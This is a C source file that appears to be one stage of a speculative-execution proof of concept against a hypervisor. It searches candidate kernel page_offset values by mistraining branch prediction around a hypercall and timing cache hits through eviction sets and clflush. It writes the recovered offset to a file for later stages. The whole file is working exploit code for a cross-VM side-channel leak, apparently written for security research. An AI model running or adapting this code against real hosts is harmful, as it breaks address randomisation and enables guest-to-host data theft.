#include "common.h"

#define STEP_SIZE 100

struct cacheline *eviction_sets[SETS_PER_IN_PAGE_OFFSET+2] = {NULL};
struct page *shared_page;

void test_page_offset(unsigned long page_offset) {
  unsigned long virt_addr = page_offset + shared_page->phys_addr;
  pipeline_flush();
  printf("%s testing candidate...\n", cur_time());
  clflush(shared_page);
  int count = 0;
  for (unsigned int set_id = 1; eviction_sets[set_id]; set_id++) {
    for (int j=0; j<100; j++) {
      pipeline_flush();
      do_flushing_and_time(eviction_sets[set_id], NULL);
      train_mispredict_and_hypercall(virt_addr, 0, R8_LOAD_ADDRESS);

      if (is_hot(shared_page)) {
        count++;
      }
      pipeline_flush();
      asm volatile("mfence":::"memory");
      clflush(shared_page);
      asm volatile("mfence":::"memory");
    }
    pipeline_flush();
  }
  pipeline_flush();
  if (count > 50) {
    printf("%s success! count=%d\n", cur_time(), count);
    write_ulong_to_file("page_offset", page_offset);
    exit(0);
  }
  printf("%s false positive? going on...\n", cur_time());
}

int main(void) {
  printf("%s === starting find_page_offset ===\n", cur_time());
  common_init();
  hot_cold_init();
  shared_page = get_shared_page();

  asm volatile("":::"memory");
  unsigned long phys_addr = shared_page->phys_addr;
  unsigned long real_phys_addr = get_physaddr_cheaty((unsigned long)(shared_page));
  unsigned long real_virt_addr = get_virtaddr_cheaty((unsigned long)(shared_page));
  printf("%s phys_addr=0x%lx real_phys_addr=0x%lx real_virt_addr=0x%lx real_page_offset=%lx\n",
    cur_time(), phys_addr, real_phys_addr, real_virt_addr, real_virt_addr-real_phys_addr);

  struct cacheline *cachelines = map_cachelines();

  for (unsigned int set_id = 1; 1; set_id++) {
    int set_size = get_lines_with_set_id_cm(eviction_sets+set_id, cachelines, set_id, EVICTION_SET_SIZE);
    if (set_size == 0) {
      eviction_sets[set_id] = NULL;
      break;
    }
  }

  unsigned int set_id = 1;
  for (unsigned long page_offset = 0UL - 256UL*(1UL<<(12+3*9)); page_offset > (1UL<<63); page_offset += (1UL<<(12+2*9))) {
    for (int i=0; i<8; i++) {
find_set:;
      if (eviction_sets[set_id] == NULL) {
        set_id = 1;
        goto find_set;
      }
      assert(set_id <= SETS_PER_IN_PAGE_OFFSET);

      unsigned long virt_addr = page_offset + shared_page->phys_addr;
      asm volatile("mfence":::"memory");
      clflush(shared_page);

      do_flushing_and_time(eviction_sets[set_id], NULL);
      train_mispredict_and_hypercall(virt_addr, 0, R8_LOAD_ADDRESS);

      if (is_hot(shared_page)) {
        printf("%s ### page_offset=0x%lx\n", cur_time(), page_offset);
        test_page_offset(page_offset);
      }

      pipeline_flush();
      asm volatile("mfence":::"memory");
      set_id++;
    }
  }
  printf("%s find_page_offset failed :(\n", cur_time());
  return 1;
}
